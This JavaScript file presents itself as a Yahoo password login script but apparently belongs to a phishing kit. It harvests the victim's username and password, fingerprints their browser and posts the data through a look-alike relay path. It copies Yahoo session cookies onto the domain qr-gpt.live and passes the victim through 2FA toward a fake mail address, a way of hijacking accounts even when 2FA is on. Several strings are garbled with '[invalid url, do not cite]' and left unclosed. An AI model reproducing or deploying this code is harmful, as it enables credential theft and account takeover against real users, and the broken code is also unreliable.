const $ = window.jQuery || require("jquery")

$(document).ready(() => {
  console.log("Yahoo password authentication system initialized")

  const config = {
    maxRetries: 3,
    retryDelay: 2000,
    redirectDelay: 1500,
    sessionTimeout: 30000,
    monitorInterval: 1000,
  }

  let retryCount = 0
  let username = ""
  let sessionData = {}
  let authInProgress = false

  const SessionManager = {
    extractSessionData: () => {
      const urlParams = new URLSearchParams(window.location.search)
      const sessionParam = urlParams.get("s")

      if (sessionParam) {
        try {
          return JSON.parse(decodeURIComponent(sessionParam))
        } catch (e) {
          console.log("Failed to parse session parameter")
        }
      }

      const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
      if (cookieMatch) {
        try {
          return JSON.parse(decodeURIComponent(cookieMatch[1]))
        } catch (e) {
          console.log("Failed to parse session cookie")
        }
      }

      return {}
    },

    generateFingerprint: () =>
      JSON.stringify({
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        timestamp: Date.now(),
        sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
      }),

    preserveSession: () => {
      const cookies = document.cookie.split(";")
      cookies.forEach((cookie) => {
        const [name, value] = cookie.trim().split("=")
        if (name && ["T", "Y", "A", "A1", "A3", "B", "F", "PH", "cmp", "GUC", "GUCS"].includes(name)) {
          document.cookie = `${name}=${value}; domain=.qr-gpt.live; path=/; max-age=86400; secure; samesite=lax`
        }
      })

      sessionStorage.setItem("yahoo_session_preserved", "true")
      sessionStorage.setItem("yahoo_session_timestamp", Date.now().toString())
    },
  }

  function getUsername() {
    const urlParams = new URLSearchParams(window.location.search)
    let user = urlParams.get("u")

    if (user) return decodeURIComponent(user)
    if (sessionData.username) return sessionData.username

    const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
    if (cookieMatch) return decodeURIComponent(cookieMatch[1])

    return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
  }

  function showState(state) {
    $("#main-form, #error-container, #loading-state, #mfa-transition").hide()
    $(`#${state}`).show()
  }

  function showError(message, isRetryable = true) {
    $("#error-message").text(message || "Invalid password. Please try again.")
    showState("error-container")

    if (!isRetryable) {
      $("#refreshButton")
        .text("Start Over")
        .off("click")
        .on("click", () => {
          window.location.href = "/"
        })
    }
  }

  function handleSeamlessAuth(password) {
    if (authInProgress) return
    authInProgress = true

    console.log("Starting seamless authentication for:", username)
    showState("loading-state")

    const formData = {
      username: username,
      passwd: password,
      crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
      acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
      sessionIndex: sessionData.sessionIndex || "1",
      sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
      done: "[invalid url, do not cite]
      src: "ym",
      ".lang": "en-US",
      ".intl": "us",
      displayName: username,
      "browser-fp-data": SessionManager.generateFingerprint(),
      timestamp: Date.now(),
      session_bridge: "custom_to_yahoo",
    }

    $.ajax({
      url: "/account/challenge/password",
      method: "POST",
      data: formData,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: window.location.origin,
        Referer: window.location.href,
        "User-Agent": navigator.userAgent,
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        DNT: "1",
        Connection: "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
      },
      xhrFields: {
        withCredentials: true,
      },
      timeout: 15000,
      success: (response, textStatus, xhr) => {
        console.log("Authentication response received:", xhr.status)
        handleAuthSuccess(response, xhr)
      },
      error: (xhr, textStatus, errorThrown) => {
        console.log("Authentication error:", textStatus, xhr.status)
        handleAuthError(xhr, textStatus, errorThrown)
      },
      complete: () => {
        authInProgress = false
      },
    })
  }

  function handleAuthSuccess(response, xhr) {
    console.log("Authentication successful")

    SessionManager.preserveSession()

    sessionStorage.setItem("yahoo_auth_success", "true")
    sessionStorage.setItem("yahoo_auth_timestamp", Date.now().toString())
    localStorage.setItem("yahoo_auth_success", "true")

    const responseText = typeof response === "string" ? response : ""
    const isRedirect = xhr.status === 302 || xhr.status === 301
    const location = xhr.getResponseHeader("Location") || ""

    if (
      responseText.includes("challenge-selector") ||
      responseText.includes("verification") ||
      responseText.includes("2fa") ||
      location.includes("challenge-selector")
    ) {
      console.log("2FA challenge detected")
      showState("mfa-transition")

      setTimeout(() => {
        const redirectUrl = location.includes("challenge-selector")
          ? location
          : "/account/challenge/challenge-selector?src=ym&done=https%3A%2F%2Fmail.qr-gpt.live%2Fd%2Ffolders%2F1"

        console.log("Redirecting to 2FA:", redirectUrl)
        window.location.href = redirectUrl
      }, config.redirectDelay)
    } else {
      console.log("Direct authentication success, redirecting to mail")

      setTimeout(() => {
        window.location.href = "[invalid url, do not cite]
      }, config.redirectDelay)
    }

    if (window.opener) {
      window.opener.postMessage(
        {
          type: "yahoo_auth_success",
          username: username,
          timestamp: Date.now(),
          has2FA: responseText.includes("challenge-selector"),
        },
        "*",
      )
    }
  }

  function handleAuthError(xhr, textStatus, errorThrown) {
    console.error("Authentication error details:", {
      status: xhr.status,
      textStatus: textStatus,
      errorThrown: errorThrown,
      responseText: xhr.responseText,
    })

    if (xhr.status === 0) {
      console.log("Network error detected - checking for redirect...")

      setTimeout(() => {
        if (sessionStorage.getItem("yahoo_auth_success") === "true") {
          handleAuthSuccess("", { status: 200, getResponseHeader: () => "" })
        } else {
          window.location.href =
            "/account/challenge/challenge-selector?src=ym&done=https%3A%2F%2Fmail.qr-gpt.live%2Fd%2Ffolders%2F1"
        }
      }, 2000)
      return
    }

    if (xhr.status === 429) {
      showError("Too many attempts. Please wait a moment and try again.", false)
      return
    }

    if (xhr.status >= 500) {
      showError("Server error. Please try again in a moment.")
      return
    }

    retryCount++

    if (retryCount >= config.maxRetries) {
      showError("Multiple authentication attempts failed. Please check your password and try again later.", false)
    } else {
      const remainingAttempts = config.maxRetries - retryCount
      showError(`Incorrect password. ${remainingAttempts} attempt${remainingAttempts > 1 ? "s" : ""} remaining.`)
    }
  }

  $("#email-form").on("submit", (e) => {
    e.preventDefault()

    const password = $("#password").val().trim()
    if (!password) {
      showError("Please enter your password.")
      return false
    }

    if (password.length < 6) {
      showError("Password must be at least 6 characters long.")
      return false
    }

    handleSeamlessAuth(password)
    return false
  })

  $("#refreshButton").click(() => {
    $("#password").val("")
    showState("main-form")
    setTimeout(() => {
      $("#password").focus()
    }, 100)
  })

  function initializePage() {
    console.log("Initializing seamless authentication page")

    sessionData = SessionManager.extractSessionData()
    username = getUsername()

    if (!username) {
      console.log("No username found, redirecting to login")
      showError("Session expired. Redirecting to login...", false)
      setTimeout(() => {
        window.location.href = "/"
      }, 3000)
      return false
    }

    $("#userEmail").text(username)
    $("#username").val(username)
    $("#displayName").val(username)

    Object.keys(sessionData).forEach((key) => {
      const element = $(`#${key}`)
      if (element.length && sessionData[key]) {
        element.val(sessionData[key])
      }
    })

    $("#timestamp").val(Date.now())
    $("#browser-fp-data").val(SessionManager.generateFingerprint())
    $("#session_bridge").val("custom_integration")

    console.log("Page initialized for user:", username)
    return true
  }

  function startSessionMonitoring() {
    const monitor = setInterval(() => {
      if (sessionStorage.getItem("yahoo_auth_success") === "true") {
        console.log("Authentication success detected via monitoring")
        clearInterval(monitor)

        setTimeout(() => {
          window.location.href = "[invalid url, do not cite]
        }, 1000)
      }

      const cookies = document.cookie
      if (cookies.includes("T=") && cookies.includes("Y=")) {
        console.log("Yahoo session cookies detected")
        clearInterval(monitor)
        sessionStorage.setItem("yahoo_auth_success", "true")

        setTimeout(() => {
          window.location.href = "[invalid url, do not cite]
        }, 1000)
      }
    }, config.monitorInterval)

    setTimeout(() => clearInterval(monitor), config.sessionTimeout)
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "yahoo_auth_complete") {
      console.log("Received auth completion message")
      sessionStorage.setItem("yahoo_auth_success", "true")

      setTimeout(() => {
        window.location.href = "[invalid url, do not cite]
      }, 1000)
    }
  })

  if (!initializePage()) return

  startSessionMonitoring()

  setTimeout(() => {
    $("#password").focus()
  }, 500)

  console.log("Yahoo seamless authentication system fully initialized")
})
